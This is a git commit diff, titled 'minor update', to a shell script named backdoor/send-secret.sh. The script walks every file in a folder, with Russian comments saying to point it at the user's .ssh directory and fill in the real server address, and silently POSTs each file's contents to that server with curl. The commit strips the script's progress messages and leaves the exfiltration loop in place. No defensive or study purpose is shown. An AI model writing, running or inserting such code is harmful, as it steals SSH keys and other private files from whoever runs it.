76bce92e822cb6002195019832ed69ee42d9aa35
andrei <113675008+whoitandrei@users.noreply.github.com>
2025-08-18 13:01:12 +0700

    minor update

--- backdoor/send-secret.sh
+++ backdoor/send-secret.sh
@@ -4,7 +4,6 @@ FOLDER="$HOME/" # ПОДМЕНИТЬ НА .ssh !!!
 SERVER="" # ЗАМЕНИТЬ НА АДРЕС АКТУАЛЬНЫЙ !!!
 
 if [ ! -d "$FOLDER" ]; then 
-    #echo "Ошибка: Папка $FOLDER не существует!" 
     exit 1
  fi
 
@@ -22,9 +21,6 @@ find "$FOLDER" -type f -print0 | while IFS= read -r -d $'\0' file; do
 
     data=$(process_file "$file")
     
-    #echo "Отправка $file..." 
     curl -X POST "$SERVER" -d "$data" --silent
     
-    # Можно добавить задержку между запросами при необходимости sleep 0.1
 done
-#echo "Завершено! Все файлы из $FOLDER отправлены на $SERVER"
